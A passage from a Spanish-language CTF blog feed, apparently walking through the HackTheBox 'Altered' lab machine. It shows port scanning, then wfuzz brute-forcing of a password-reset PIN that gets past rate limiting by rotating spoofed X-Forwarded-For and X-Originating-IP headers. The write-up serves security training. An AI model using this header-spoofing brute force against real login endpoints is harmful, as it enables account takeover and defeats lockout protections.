<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-10-20T14:00:04-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Altered (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html" rel="alternate" type="text/html" title="HackTheBox - Altered (hard)" /><published>2024-10-20T00:00:00-06:00</published><updated>2024-10-20T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/10/20/altered.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/a309dc491e50db28bf0f1ea691879b89.png" />
</p>

<ul>
  <li>Further enchance your skills by exploring related academy modules.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.159 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-13 16:48 CST
Nmap scan report <span class="k">for </span>10.10.11.159
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-title: UHC March Finals
|_Requested resource was http://10.10.11.159/login
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos 2 puertos abiertos el puerto 22 que corresponde al servicio <code class="language-plaintext highlighter-rouge">ssh</code> y el puerto 80 que corresponde a un servicio <code class="language-plaintext highlighter-rouge">http</code> el cual esta corriendo una pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">Meta</span><span class="o">-</span><span class="no">Refresh</span><span class="o">-</span><span class="no">Redirect</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Redirecting</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="o">/</span><span class="n">login</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Cookies</span><span class="p">[</span><span class="no">XSRF</span><span class="o">-</span><span class="no">TOKEN</span><span class="p">,</span><span class="n">laravel_session</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.159</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.9</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Laravel</span><span class="p">,</span> <span class="no">PasswordField</span><span class="p">[</span><span class="n">password</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">UHC</span> <span class="no">March</span> <span class="no">Finals</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="n">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Frame</span><span class="o">-</span><span class="no">Options</span><span class="p">[</span><span class="no">SAMEORIGIN</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">UA</span><span class="o">-</span><span class="no">Compatible</span><span class="p">[</span><span class="no">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>La pagina web nos redirige a un panel de login.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/1.png" />
</p>

<ul>
  <li>Si probamos con <code class="language-plaintext highlighter-rouge">admin:admin</code> no funciona pero si le damos en recuperar contraseña vemos que nos dicen que introduzcamos un PIN que nos envían al parecer por correo pero no tenemos acceso al correo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/2.png" />
</p>

<ul>
  <li>Si ponemos <code class="language-plaintext highlighter-rouge">PINs</code> incorrectos nos da este error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/3.png" />
</p>

<ul>
  <li>Tenemos 2 cookies.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/4.png" />
</p>

<h2 id="rate-limit-bypass">Rate-Limit Bypass</h2>

<ul>
  <li>Lo que podemos hacer es Fuerza bruta al <code class="language-plaintext highlighter-rouge">PIN</code> con <code class="language-plaintext highlighter-rouge">wfuzz</code> pero primero tenemos que capturar la petición a la hora de mandar el PIN para saber como esta viajando la data.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/5.png" />
</p>

<ul>
  <li>Después de un cierto momento al parecer nos bloquean.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/6.png" />
</p>

<ul>
  <li>
    <p>Existen formas de hacer <code class="language-plaintext highlighter-rouge">Bypass</code> <a href="https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass">https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass</a> ya que al parecer si ve que estamos tramitando muchas peticiones desde una misma IP nos bloquea, vamos abusar de las cabeceras.</p>
  </li>
  <li>
    <p>El problema de enviar esta petición es que se va a dar cuenta de que no es dinamico.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-H</span> <span class="s2">"X-Originating-IP: 127.0.0.1"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>
    <p>Tendremos que crear un diccionario con diferentes <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
  </li>
  <li>
    <p>Mediante 2 bucles aninados vamos a crear el diccionario con las <code class="language-plaintext highlighter-rouge">IPs</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..40<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in</span> <span class="o">{</span>0..253<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"10.10.</span><span class="nv">$i</span><span class="s2">.</span><span class="nv">$j</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> <span class="o">&gt;</span> IPs
❯ <span class="nb">wc</span> <span class="nt">-l</span> IPs
10414 IPs
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos que no esta iterando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.159/api/resettoken
Total requests: 104140000

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000000001:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.0"</span>                             
000000003:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.2"</span>                             
000000016:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.15"</span>                            
000000019:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.18"</span>                            
000000007:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.6"</span>                             
000000020:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.19"</span>                            
000000018:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.17"</span>                            
000000015:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.14"</span>                            
000000014:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.13"</span>                            
000000009:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.8"</span>                             
000000011:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.10"</span>                            
000000017:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.16"</span>                            
000000013:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.12"</span>                            
000000064:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.63"</span>                            
000000061:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.60"</span>                            
000000059:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.58"</span>                            
000000063:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.62"</span>                            
000000062:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.61"</span>                            
000000060:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.59"</span>                            
000000057:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.56"</span>                            
000000056:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.55"</span>                            
000000054:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.53"</span>                            
000000053:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.52"</span>                            
000000050:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.49"</span>                            
000000071:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.70"</span>                            
000000069:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.68"</span>                            
000000073:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.72"</span>                            
000000058:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.57"</span>                            
000000075:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.74"</span>                            
000000070:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.69"</span>                            
000000049:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.48"</span>                            
000000052:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.51"</span>                            
000000072:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.71"</span>                            
000000048:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.47"</span>                            
000000068:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.67"</span>                            
000000051:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.50"</span>                            
000000067:   200        140 L    324 W      5644 Ch     <span class="s2">"0000 - 10.10.0.66"</span>                            
000000082:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.81"</span>                            
000000078:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.77"</span>                            
000000076:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.75"</span>                            
000000047:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.46"</span>                            
000000045:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.44"</span>                            
000000055:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.54"</span>                            
000000090:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.89"</span>                            
000000087:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.86"</span>                            
000000086:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.85"</span>                            
000000081:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.80"</span>                            
000000077:   429        36 L     125 W      6625 Ch     <span class="s2">"0000 - 10.10.0.76"</span>  
</code></pre></div></div>

<ul>
  <li>Para que itere tenemos que usar el parámetro <code class="language-plaintext highlighter-rouge">-m</code> en <code class="language-plaintext highlighter-rouge">wfuzz</code> para que itere.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Originating-IP: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno si lo ejecutamos nos sigue bloqueando.</p>
  </li>
  <li>
    <p>Vamos a cambiar las cabecera a esta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhFWnVudXJLVmhGM1IyWVFJbER0YkE9PSIsInZhbHVlIjoiWjIreGdWZGVoZDJtWmRiY0NGaEhraldmZE5KYVhuYzFIaWorWjQ4RXhUWitITTdnYk5HQW9uR0VTdjJVYVBjWEdLTXA3R3JzQjJIcVBCNzc5WmdoWFdDRVJXWEFHU1JzWTU0OHNlTXBIOVRJcVVuN0Q4eHRMUTRhSnB2eGQxdzkiLCJtYWMiOiIyZDQ2ZDhjZWQ0NTliY2M3NjQwNzE2ZjY5MDkxZGZkYjlkMTNkOTRkOTU1ODYwN2ZkZjZlMDljYTk5ZTE4N2U2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
</code></pre></div></div>

<ul>
  <li>No nos bloquea pero obtenemos respuestas iguales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000001471:   200        140 L    324 W      5644 Ch     <span class="s2">"1470 - 10.10.5.200"</span>                           
000001474:   200        140 L    324 W      5644 Ch     <span class="s2">"1473 - 10.10.5.203"</span>                           
000001490:   200        140 L    324 W      5644 Ch     <span class="s2">"1489 - 10.10.5.219"</span>                           
000001478:   200        140 L    324 W      5644 Ch     <span class="s2">"1477 - 10.10.5.207"</span>                           
000001502:   200        140 L    324 W      5644 Ch     <span class="s2">"1501 - 10.10.5.231"</span>                           
000001501:   200        140 L    324 W      5644 Ch     <span class="s2">"1500 - 10.10.5.230"</span>                           
000001477:   200        140 L    324 W      5644 Ch     <span class="s2">"1476 - 10.10.5.206"</span>                           
000001500:   200        140 L    324 W      5644 Ch     <span class="s2">"1499 - 10.10.5.229"</span>                           
000001496:   200        140 L    324 W      5644 Ch     <span class="s2">"1495 - 10.10.5.225"</span>                           
000001504:   200        140 L    324 W      5644 Ch     <span class="s2">"1503 - 10.10.5.233"</span>                           
000001497:   200        140 L    324 W      5644 Ch     <span class="s2">"1496 - 10.10.5.226"</span>                           
000001503:   200        140 L    324 W      5644 Ch     <span class="s2">"1502 - 10.10.5.232"</span>                           
000001499:   200        140 L    324 W      5644 Ch     <span class="s2">"1498 - 10.10.5.228"</span>                           
000001495:   200        140 L    324 W      5644 Ch     <span class="s2">"1494 - 10.10.5.224"</span>                           
000001498:   200        140 L    324 W      5644 Ch     <span class="s2">"1497 - 10.10.5.227"</span>                           
000001492:   200        140 L    324 W      5644 Ch     <span class="s2">"1491 - 10.10.5.221"</span>                           
000001507:   200        140 L    324 W      5644 Ch     <span class="s2">"1506 - 10.10.5.236"</span>                           
000001511:   200        140 L    324 W      5644 Ch     <span class="s2">"1510 - 10.10.5.240"</span>                           
000001493:   200        140 L    324 W      5644 Ch     <span class="s2">"1492 - 10.10.5.222"</span>                           
000001505:   200        140 L    324 W      5644 Ch     <span class="s2">"1504 - 10.10.5.234"</span>                           
000001520:   200        140 L    324 W      5644 Ch     <span class="s2">"1519 - 10.10.5.249"</span>                           
000001489:   200        140 L    324 W      5644 Ch     <span class="s2">"1488 - 10.10.5.218"</span>                           
000001491:   200        140 L    324 W      5644 Ch     <span class="s2">"1490 - 10.10.5.220"</span>                           
000001506:   200        140 L    324 W      5644 Ch     <span class="s2">"1505 - 10.10.5.235"</span>                           
000001517:   200        140 L    324 W      5644 Ch     <span class="s2">"1516 - 10.10.5.246"</span>                           
000001514:   200        140 L    324 W      5644 Ch     <span class="s2">"1513 - 10.10.5.243"</span>                           
000001516:   200        140 L    324 W      5644 Ch     <span class="s2">"1515 - 10.10.5.245"</span>                           
000001534:   200        140 L    324 W      5644 Ch     <span class="s2">"1533 - 10.10.6.9"</span>                             
000001530:   200        140 L    324 W      5644 Ch     <span class="s2">"1529 - 10.10.6.5"</span>                             
000001513:   200        140 L    324 W      5644 Ch     <span class="s2">"1512 - 10.10.5.242"</span>                           
000001525:   200        140 L    324 W      5644 Ch     <span class="s2">"1524 - 10.10.6.0"</span>                             
000001542:   200        140 L    324 W      5644 Ch     <span class="s2">"1541 - 10.10.6.17"</span>                            
000001527:   200        140 L    324 W      5644 Ch     <span class="s2">"1526 - 10.10.6.2"</span>                             
000001538:   200        140 L    324 W      5644 Ch     <span class="s2">"1537 - 10.10.6.13"</span>                            
000001541:   200        140 L    324 W      5644 Ch     <span class="s2">"1540 - 10.10.6.16"</span>                            
000001540:   200        140 L    324 W      5644 Ch     <span class="s2">"1539 - 10.10.6.15"</span>  
</code></pre></div></div>

<ul>
  <li>Bueno ahora es mas fácil solo ocultamos respuestas con esos caracteres y listo pero antes capturaremos otra vez la petición para cambiar la cookie y sea valida para la petición que estamos haciendo desde la web.</li>
</ul>

